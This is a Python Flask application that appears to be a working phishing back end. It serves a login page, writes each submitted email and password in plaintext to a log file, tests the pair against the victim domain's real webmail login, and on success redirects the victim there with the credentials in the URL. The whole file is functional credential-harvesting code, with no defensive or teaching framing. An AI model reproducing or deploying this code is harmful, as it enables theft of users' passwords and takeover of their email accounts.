from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
import requests
import logging

app = Flask(__name__)

# Configure logging to write to a text file
logging.basicConfig(
    filename='app.log',  # Log file name
    level=logging.INFO,   # Log level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
    format='%(asctime)s - %(levelname)s - %(message)s'  # Log message format
)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        # Redirect to home if accessed via GET
        return redirect(url_for('home'))
    
    user_email = request.form['user']  # Changed to 'user'
    user_password = request.form['pass']  # Changed to 'pass'
    
    domain = user_email.split('@')[1]
    
    # Log the login attempt with the email and password used
    logging.info(f"Login attempt for user: {user_email} with password: {user_password}")

    # Create a session
    session = requests.Session()

    # Define login URL and credentials
    scrapeurl = f"https://webmail.{domain}/login/?login_only=1"
    login_url = scrapeurl
    credentials = {
        'user': user_email,
        'pass': user_password
    }

    # Define any custom headers you want to include
    headers = {
        'Connection': 'keep-alive',
        'Accept': '*/*',
        'User -Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',  # Example header
        'Content-Type': 'application/x-www-form-urlencoded',  # Content type for form data
        'Origin': f'https://webmail.{domain}',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Ch-Ua': '^^',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '^^Windows^^""',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': 'webmailsession=^%^3apzO8QB3fiq2pIjKN^%^2c5a520e5e257788ee08be84b689a7b494; roundcube_cookies=enabled; timezone=Asia/Kolkata',
        'Referer': f'https://webmail.{domain}'
    }

    # Send POST request to login with headers
    response = session.post(login_url, data=credentials, headers=headers)

    # Log the response for debugging
    logging.info(f"Response Status Code: {response.status_code}")
    logging.info(f"Response Status Message: {response.text}")

    # Check if the response code indicates success
    if response.status_code == 200:
        # Parse the JSON response
        json_response = response.json()
        
        # Check the status field
        if json_response.get('status') == 1:
            bbox = f"https://webmail.{domain}/login/?user={user_email}&pass={user_password}"
            logging.info(f"Login successful for user: {user_email}")
            return jsonify({"response_status": "success", "redirect": bbox})
        else:
            logging.warning(f"Login failed for user: {user_email} - Invalid credentials")
            return render_template('login.html', login_failed=True)
    else:
        # Handle cases where the response is not 200
        json_response = response.json()
        logging.error(f"Login failed with status code: {response.status_code}, message: {json_response.get('status')}")
        return render_template('login.html', login_failed=True)

if __name__ == '__main__':
    app.run(debug=True, port=80)
